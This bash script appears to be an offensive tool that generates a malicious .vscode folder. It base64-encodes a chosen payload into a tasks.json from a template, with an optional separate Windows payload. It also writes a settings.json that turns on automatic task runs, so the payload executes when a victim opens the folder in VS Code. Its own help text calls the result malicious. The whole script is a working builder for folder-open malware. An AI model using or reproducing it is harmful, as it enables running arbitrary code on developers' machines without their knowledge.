#!/usr/bin/env bash
for i in "$@"; do
    case $i in
    --windows|-w)
        WINDOWS_PAYLOAD=$2
        shift;shift;
        ;;
    --zip|-z)
        ZIP=true
        ;;
    --help|-h)
        HELP=true
        ;;
    *)    
        ;;
    esac
done

## colors spectrum
TEAL='\033[1;36m'
NC='\033[0m' # No Color
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
CYAN='\033[1;96m'


## Help part
if [[ "$HELP" ]];
then
    echo -e "Usage: ${GREEN}$0${NC} [flag] ${GREEN}'${NC}[payload]${GREEN}'${NC} "
    echo -e "\t--windows/-w\tspecify specific payload for windows"
    echo -e "\t--zip/-z\tzip the malicious .vscode folder"
    echo 
    exit 92
fi

SETTING_JSON='{"task.allowAutomaticTasks": "on"}'

PAYLOAD_B64="$(echo "${1}" | base64 -w0)"

TASKFILE="tasks.json"

# creating .vscode
echo -e "${CYAN}[${RED}+${CYAN}]${NC} Create .vscode"
rm -rf .vscode &>/dev/null
mkdir .vscode
cp $TASKFILE.tpl .vscode/$TASKFILE

# Inject payload
echo -e "${CYAN}[${RED}+${CYAN}]${NC} Inject payload"
sed -i "s/PAYLOAD_B64/${PAYLOAD_B64}/g" .vscode/${TASKFILE}
sed -i "s/WINDOWS_PAYLOAD/${WINDOWS_PAYLOAD}/g" .vscode/${TASKFILE}

# Inject automatic task run setting
echo -e "${CYAN}[${RED}+${CYAN}]${NC} Inject automatic task run setting"
echo "${SETTING_JSON}" > .vscode/settings.json

# Zip it?
if [[ "$ZIP" ]];
then
    echo "zipping"
fi